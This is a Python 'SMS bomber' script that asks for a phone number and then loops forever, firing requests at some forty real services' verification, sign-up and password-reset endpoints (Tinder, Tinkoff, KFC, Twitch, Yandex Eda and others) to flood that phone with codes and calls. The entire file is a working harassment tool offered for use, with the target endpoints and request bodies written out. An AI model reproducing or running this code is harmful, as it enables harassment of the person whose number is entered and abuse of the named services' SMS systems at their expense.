import random, os, ctypes
import pip
console_clear = 'clear'
try:
	kernel32 = ctypes.windll.kernel32
	kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
	console_clear = 'cls'
except:
	pass

reloaded = False
def install(package):
	global reloaded
	if hasattr(pip, 'main'):
		pip.main(['install', package])
	else:
		pip._internal.main(['install', package])
	reloaded = True

try:
	import requests
except:
	install('requests')
try:
	import asyncio
except:
	install('asyncio')

class Fore:
    GREEN = '\033[32m'
    RED = '\033[31m'
    CLEAR = '\033[0m'

logo = ('''\033[35m

   _____ _                 _ _      _   ____                  _               
  / ____| |               | | |    | | |  _ \                | |              
 | |    | | ___  _   _  __| | | ___| |_| |_) | ___  _ __ ___ | |__   ___ _ __ 
 | |    | |/ _ \| | | |/ _` | |/ _ | __|  _ < / _ \| '_ ` _ \| '_ \ / _ | '__|
 | |____| | (_) | |_| | (_| | |  __| |_| |_) | (_) | | | | | | |_) |  __| |   
  \_____|_|\___/ \__,_|\__,_|_|\___|\__|____/ \___/|_| |_| |_|_.__/ \___|_| 
\033[0m''')
os.system(console_clear)
print(logo)
if reloaded:
	input("Please restart this script")
	exit(1)
_phone = input('Please enter phone number > ')
_phone = _phone.strip()


if _phone[0] == '+':
	if not _phone[1:].isdigit():
		exit(1)
	_phone = _phone[1:]
if _phone[0] == '8':
	if not _phone.isdigit():
		exit(1)
	_phone = '7'+_phone[1:]
if _phone[0] == '9':
	if not _phone.isdigit():
		exit(1)
	_phone = '7'+_phone

_name = ''
for x in range(12):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	passmegafon = random.choice(list('123456789'))

_phone9 = _phone[1:]
_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]

async def grab():
	try:
		requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', timeout=5, data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
		print(Fore.GREEN + '[+] Grab отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def rutaxi():
	try:
		requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}, timeout=5)
		print(Fore.GREEN + '[+] RuTaxi отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def belkacar():
	try:
		requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={}, timeout=5)
		print(Fore.GREEN + '[+] BelkaCar отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def tinder():
	try:
		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={}, timeout=5)
		print(Fore.GREEN + '[+] Tinder отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def karusel():
	try:
		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={}, timeout=5)
		print(Fore.GREEN + '[+] Karusel отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def tinkoff():
	try:
		requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={}, timeout=5)
		print(Fore.GREEN + '[+] Tinkoff отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def mts():
	try:
		requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={}, timeout=5)
		print(Fore.GREEN + '[+] MTS отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def youla():
	try:
		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone}, timeout=5)
		print(Fore.GREEN + '[+] Youla отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def pizzahunt():
	try:
		requests.post('https://pizzahut.ru/account/password-reset', timeout=5, data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
		print(Fore.GREEN + '[+] PizzaHut отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def rabota():
	try:
		requests.post('https://www.rabota.ru/remind', data={'credential': _phone}, timeout=5)
		print(Fore.GREEN + '[+] Rabota отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def rutube():
	try:
		requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone}, timeout=5)
		print(Fore.GREEN + '[+] Rutube отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def citilink():
	try:
		requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/', timeout=5)
		print(Fore.GREEN + '[+] Citilink отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def smsint():
	try:
		requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', timeout=5, data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
		print(Fore.GREEN + '[+] Smsint отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def oyorooms():
	try:
		requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en', timeout=5)
		print(Fore.GREEN + '[+] oyorooms отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def mvideo():
	try:
		requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', timeout=5, params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
		print(Fore.GREEN + '[+] MVideo отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def newnext():
	try:
		requests.post('https://newnext.ru/graphql', timeout=5, json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
		print(Fore.GREEN + '[+] newnext отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def sunlight():
	try:
		requests.post('https://api.sunlight.net/v3/customers/authorization/', timeout=5, data={'phone': _phone})
		print(Fore.GREEN + '[+] Sunlight отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def alpari():
	_email = _name+f'{random.randint(0, 1000000)}'+'@gmail.com'
	try:
		requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', timeout=5, json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
		print(Fore.GREEN + '[+] alpari отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def invitro():
	try:
		requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', timeout=5, data={'phone': _phone})
		print(Fore.GREEN + '[+] Invitro отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def sberbank():
	try:
		requests.post('https://online.sbis.ru/reg/service/', timeout=5, json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
		print(Fore.GREEN + '[+] Sberbank отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def psbank():
	try:
		requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', timeout=5, json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
		print(Fore.GREEN + '[+] Psbank отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def beltelecom():
	try:
		requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', timeout=5, data={'phone': _phone})
		print(Fore.GREEN + '[+] Beltelcom отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def kfc():
	try:
		requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', timeout=5, json={'phone': '+' + _phone})
		print(Fore.GREEN + '[+] KFC отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def carsmile():
	try:
		requests.post("https://api.carsmile.com/", timeout=5, json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
		print(Fore.GREEN + '[+] carsmile отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def delitime():
	try:
		requests.post("https://api.delitime.ru/api/v2/signup", timeout=5, data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
		print(Fore.GREEN + '[+] Delitime отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def findclone():
	try:
		requests.get('https://findclone.ru/register', timeout=5, params={'phone': '+' + _phone})
		print(Fore.GREEN + '[+] findclone звонок отправлен!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def guru():
	try:
		requests.post("https://guru.taxi/api/v1/driver/session/verify", timeout=5, json={"phone": {"code": 1, "number": _phone}})
		print(Fore.GREEN + '[+] Guru отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def icq():
	try:
		requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', timeout=5, data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
		print(Fore.GREEN + '[+] ICQ отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def indriver():
	try:
		requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru", timeout=5, data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
		print(Fore.GREEN + '[+] InDriver отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def pmsm():
	try:
		requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', timeout=5, json={"phone": _phone})
		print(Fore.GREEN + '[+] Pmsm отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def ivi():
	try:
		requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", timeout=5, data={"phone": _phone})
		print(Fore.GREEN + '[+] IVI отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def lenta():
	try:
		requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', timeout=5, json={'phone': '+' + _phone})
		print(Fore.GREEN + '[+] Lenta отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def mailru():
	try:
		requests.post('https://cloud.mail.ru/api/v2/notify/applink', timeout=5, json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
		print(Fore.GREEN + '[+] Mail.ru отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def okru():
	try:
		requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", timeout=5, data={"st.r.phone": "+" + _phone})
		print(Fore.GREEN + '[+] OK отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def plink():
	try:
		requests.post('https://plink.tech/register/', timeout=5, json={"phone": _phone})
		print(Fore.GREEN + '[+] Plink отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def qlean():
	try:
		requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", timeout=5, json={"phone": _phone})
		print(Fore.GREEN + '[+] qlean отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def smsgorod():
	try:
		requests.post("http://smsgorod.ru/sendsms.php", timeout=5, data={"number": _phone})
		print(Fore.GREEN + '[+] SMSgorod отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def twitch():
	try:
		requests.post('https://passport.twitch.tv/register?trusted_request=true', timeout=5, json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
		print(Fore.GREEN + '[+] Twitch отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def cabwifi():
	try:
		requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', timeout=5, data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
		print(Fore.GREEN + '[+] CabWiFi отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def wowworks():
	try:
		requests.post("https://api.wowworks.ru/v2/site/send-code", timeout=5, json={"phone": _phone, "type": 2})
		print(Fore.GREEN + '[+] wowworks отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def yandex_eda():
	try:
		requests.post('https://eda.yandex/api/v1/user/request_authentication_code', timeout=5, json={"phone_number": "+" + _phone})
		print(Fore.GREEN + '[+] Eda.Yandex отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def alpari():
	_email = _name+f'{random.randint(0, 1000000)}'+'@gmail.com'
	try:
		requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', timeout=5, json={"client_type": "personal", "email": _email,"mobile_phone": _phone, "deliveryOption": "sms"})
		print(Fore.GREEN + '[+] Alpari отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def anytime():
	try:
		requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", timeout=5, data={"phone": _phone})
		print(Fore.GREEN + '[+] anytime отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def delivery_club():
	try:
		requests.post('https://www.delivery-club.ru/ajax/user_otp', timeout=5, data={"phone": _phone})
		print(Fore.GREEN + '[+] Delivery club отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def megafon():
	try:
		requests.post('https://bmp.megafon.tv/api/v10/auth/register/msisdn', timeout=5, json={"msisdn":_phone,"password":passmegafon})
		print(Fore.GREEN + '[+] Megafon отправлено!' + Fore.CLEAR)
	except:
		print(Fore.RED + '[-] Не отправлено!' + Fore.CLEAR)

async def main():
	func = [grab, rutaxi, belkacar, tinder, karusel, tinkoff, mts, youla,
			pizzahunt, rabota, rutube, citilink, oyorooms, mvideo, newnext,
			sunlight, alpari, invitro, sberbank, psbank, beltelecom, karusel,
			kfc, carsmile, citilink, delitime, findclone, guru, icq, yandex_eda,
			invitro, pmsm, ivi, lenta, mailru, mvideo, okru, plink, qlean, twitch,
			tinder, indriver, cabwifi, wowworks, smsgorod, youla, alpari, anytime,
			delivery_club, megafon]

	while True:
		for function in func:
			asyncio.ensure_future(function())
		print("next iteration")
		await asyncio.sleep(1)

if __name__ == "__main__":
	asyncio.run(main())
